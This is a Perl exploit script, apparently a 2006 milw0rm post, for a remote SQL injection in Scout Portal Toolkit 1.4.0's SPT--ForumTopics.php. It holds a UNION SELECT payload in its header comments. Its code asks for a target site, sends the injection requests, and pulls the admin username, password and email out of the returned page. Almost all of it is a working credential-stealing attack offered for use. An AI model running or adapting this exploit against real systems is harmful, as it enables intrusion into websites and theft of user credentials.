#!/usr/bin/perl
#===============================================================
#    Scout Portal Toolkit 1.4.0 Remote SQL injection Exploit 
#    Coded By Simo64
#    Moroccan Security Research Team
#   Specials thx to :Greetz : 

#  CiM-Team - CrAsH_oVeR_rIdE -  dabdoub - damip - DarkbiteX - drackanz - Iss4m -  megamati 
#  Mourad - Preddy -Rachid - RapYaS - r00tkita - S4mi - secteura - Silitix - tahati - And All Freinds !
#===============================================================

# Details  :
#  Scout Portal Toolkit 1.4.0 Remote SQL injection Vulnerability
#  Website : http://scout.wisc.edu/Projects/SPT/
#  Vulnerable File : SPT--ForumTopics.php

#  PoC : http://host/path/SPT--ForumTopics.php?forumid=[SQL]
#  Exemple :
#  This  will display admin name and password
#  Exploit : http://victime/path/SPT--ForumTopics.php?forumid=-9+UNION+SELECT+null,UserName,UserPassword,33,44,55+FROM+APUsers+WHERE+UserId=1
#  The exploit will work regardless of magic_quotes_gpc is set or not
#==============================================================


use LWP::Simple;

print "\n===============================================================";
print "\n=  Scout Portal Toolkit <= 1.4.0 Remote SQL injection Exploit =";
print "\n=             Discovred & Coded By Simo64                     =";

print "\n=           Moroccan Security Research Team                   =";
print "\n===============================================================\n\n";

my($targ,$path,$userid,$xpl,$xpl2,$data,$data2,$email);

       print "Enter Traget Exemple: http://site.com/ \nTraget : ";
       chomp($targ = <STDIN>);
       print "\n\nEnter Path TO Portal exemple:  /SPT/ OR just / \nPath : ";

       chomp($path=<STDIN>);
       print "\n\nEnter userid  Exemple: 1\nUserID :  ";
       chomp($userid=<STDIN>);

$xpl1="-9+UNION+SELECT+null,UserName,UserPassword,null,null,null+FROM+APUsers+WHERE+UserId=";

$xpl2="-9+UNION+SELECT+null,Email,null,null,null,null+FROM+APUsers+WHERE+UserId=";
print "\n[+] Connecting to: $targ\n";
$data = get($targ.$path."SPT--ForumTopics.php?forumid=".$xpl1.$userid) || die "\n[+]Connexion Failed!\n";

$data2 = get($targ.$path."SPT--ForumTopics.php?forumid=".$xpl2.$userid) || die "\n[+]Connexion Failed!\n";
print "\n[+] Connected !\n";
print "[+] Sending Data to $targ ....\n\n";


$username=substr($data,index($data,"<h1>")+11,index($data,"</h1>")-12);
chomp $username;

$password=substr($data,index($data,"</h1>")+34,index($data,"</p>")-index($data,"</h1>")-34);

chomp $password;

$email=substr($data2,index($data,"<h1>")+11,index($data2,"</h1>")-12);
chomp $email;

if(length($password) <= 34){
print "[!]Exploit Succeded !\n********************\n\n=========  UserID = $userid Infos =======";

print "\n= UserID   : ".$userid;
print "\n= Username : ".$username;
print "\n= Password : ".$password;
print "\n= Email    : ".$email;
print "\n===================================\n\nEnjoy !";

}
else {print "\n[!] Exploit Failed !";}

# milw0rm.com [2006-06-27]
